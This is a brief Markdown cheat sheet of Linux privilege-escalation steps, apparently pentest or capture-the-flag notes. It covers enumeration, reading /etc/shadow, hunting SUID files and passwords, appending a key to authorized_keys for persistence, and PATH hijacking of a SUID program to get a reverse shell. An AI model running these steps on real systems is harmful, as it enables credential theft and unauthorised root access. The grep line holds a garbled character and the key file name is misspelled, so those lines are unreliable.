## Privilege escalation on Linux
### System/user info
`uname -a` Kernel version

`env` Environment variables

`whoami`

`history`

### Other users/history
`who`

`w`

`last`

### Sudoers check
`sudo -l` From sudo's man page:
```
     -l, --list  If no command is specified, list the allowed (and
                 forbidden) commands for the invoking user (or the user
                 specified by the -U option) on the current host. A
                 longer list format is used if this option is specified
                 multiple times and the security policy supports a
                 verbose output format.

                 If a command is specified and is permitted by the
                 security policy, the fully-qualified path to the
                 command is displayed along with any command line
                 arguments.  If command is specified but not allowed,
                 sudo will exit with a status value of 1.
```

Get superusers:
 `grep -v -E "Ë†#" /etc/passwd | awk -F: '$3 == 0 {print $1}'`
 
 ### Network check
 `ifconfig -a`

 `netstat -antup`
 
`lsof -a`

### Processes & software
`ps aux`

List versions of software in the machine (mysql, httpd, python, etc).

### SUID files
These are files that can be run as an admin from another user:

`find / -perm -u=s -type f 2>/dev/null`

### Password hashes:

`cat /etc/shadow`

### Cron jobs

`ls -la /etc/cron*`

Files that another user may be executing and that you can overwrite. If when analyzing the processes there are files that are being executed/copied/used at all by root, for instance, if you can modify those you can get root to run arbitrary code.

### Check for ssh keys:

`ls -la ~/.ssh`

Find passwords around:

`find . -type f -maxdepth 4 | xargs grep -i "password"`

## Search for vulnerabilities
Use `searchsploit` to see if the kernel is vulnerable.

`searchsploit kernel X.Y linux` | sort -n

## Getting a steadier shell
Write your public key to `~/.ssh/authorized-keys` and connect by ssh:

`echo 'your public key' >> ~/.ssh/authorized-keys`

## Trick program that calls other through PATH
(magic) Through SUID check we notice that the user can execute /bin/sysinfo as root. As sysinfo calls lshw, we create another file called lshw that reverse shells to us, and add the path of our malicious lshw to the beginning of the PATH (add the full one, including the file name).
